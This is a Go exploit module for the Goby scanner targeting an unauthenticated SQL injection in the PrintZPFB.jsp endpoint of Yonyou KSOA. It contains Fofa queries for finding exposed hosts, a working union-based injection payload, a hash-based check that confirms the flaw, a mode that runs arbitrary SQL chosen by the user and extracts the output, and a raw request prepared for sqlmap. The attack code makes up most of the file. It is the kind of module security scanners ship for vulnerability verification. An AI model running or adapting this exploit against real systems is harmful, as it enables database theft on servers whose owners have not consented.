package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yonyou-Time-and-Space-KSOA PrintZP SQL Injection Vulnerability",
    "Description": "<p>Yonyou yonyou-Time-and-Space-KSOA is a new generation of products developed under the guidance of SOA concept. IT is a unified IT infrastructure launched according to the frontier IT needs of circulation enterprises, which allows IT systems established in various periods of circulation enterprises to easily talk to each other.​</p><p>There is SQL injection vulnerability at the PrintZP interface of Yonyou yonyou-Time-and-Space-KSOA. An unauthenticated remote attacker can not only use the SQL injection vulnerability to obtain information in the database, but also write a Trojan horse to the server in the case of high permission to further obtain the server system permission.</p>",
    "Product": "yonyou-Time-and-Space-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-08-02",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || body=\"check.jsp?pid=\" && title=\"企业信息系统门户\"",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\" || body=\"productKSOA.jpg\" || body=\"check.jsp?pid=\" && title=\"企业信息系统门户\"",
    "Level": "2",
    "Impact": "<p>There is SQL injection vulnerability at the PrintZP interface of Yonyou yonyou-Time-and-Space-KSOA. An unauthenticated remote attacker can not only use the SQL injection vulnerability to obtain information in the database, but also write a Trojan horse to the server in the case of high permission to further obtain the server system permission.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "db_name()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "用友时空KSOA PrintZP.jsp SQL 注入漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>用友时空 KSOA 是建立在 SOA 理念指导下研发的新一代产品，是根据流通企业前沿的 IT 需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的 IT 系统之间彼此轻松对话。<br></p><p>用友时空KSOA系统 PrintZP.jsp接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友时空KSOA系统 PrintZP.jsp接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Yonyou-Time-and-Space-KSOA PrintZP SQL Injection Vulnerability",
            "Product": "yonyou-Time-and-Space-KSOA",
            "Description": "<p>Yonyou yonyou-Time-and-Space-KSOA is a new generation of products developed under the guidance of SOA concept. IT is a unified IT infrastructure launched according to the frontier IT needs of circulation enterprises, which allows IT systems established in various periods of circulation enterprises to easily talk to each other.​</p><p>There is SQL injection vulnerability at the PrintZP interface of Yonyou yonyou-Time-and-Space-KSOA. An unauthenticated remote attacker can not only use the SQL injection vulnerability to obtain information in the database, but also write a Trojan horse to the server in the case of high permission to further obtain the server system permission.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is SQL injection vulnerability at the PrintZP interface of&nbsp;Yonyou yonyou-Time-and-Space-KSOA. An unauthenticated remote attacker can not only use the SQL injection vulnerability to obtain information in the database, but also write a Trojan horse to the server in the case of high permission to further obtain the server system permission.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10984"
}`

	setSqlPayloadHash_PFKANV639s00 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false

			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		urlget := `/kp/PrintZPFB.jsp?zpfbbh=1%27+union+select+1,2,3,4,('abc'%2B` + url.QueryEscape(sql) + `%2B'abc')+--+`

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Referer":         hostInfo.FixedHostInfo,
		}
		resp, err = setGetRequest(hostInfo, urlget, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}

		//配置漏洞存在的路径
		vulurl = urlget

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			MD5 := func(v string) string {
				d := []byte(v)
				m := md5.New()
				m.Write(d)
				return hex.EncodeToString(m.Sum(nil))
			}
			randomString := goutils.RandomHexString(8)

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := MD5(randomString)

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `(SELECT (sys.fn_sqlvarbasetostr(HASHBYTES('MD5','` + randomString + `'))))`

			sendPayload := setSqlPayloadHash_PFKANV639s00

			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil || !strings.Contains(resp.RawBody, content) {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			// 1.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "Get /kp/PrintZPFB.jsp?zpfbbh=1%27+union+select+1,2,3,4,db_name()+--+ HTTP/1.1\nHost: " + expResult.HostInfo.HostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25\n"

			// 2.配置正则语句，从响应包中提取出数据
			regular := `abc([\s\S]*?)abc`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}

			sendPayload := setSqlPayloadHash_PFKANV639s00
			attacktype := goutils.B2S(ss.Params["attackType"])

			switch attacktype {

			case "sql":
				sql := goutils.B2S(ss.Params["sql"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed` + err.Error()
					expResult.Success = false
					return expResult
				}

				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "Exploitation failed "
					return expResult
				}
				expResult.Success = true
				expResult.Output = output

			case "sqlpoint":
				expResult.Success = true
				expResult.Output = sqlpoint

			default:
				expResult.Success = false
				expResult.Output = "Unknown attack type"

			}
			return expResult
		},
	))
}
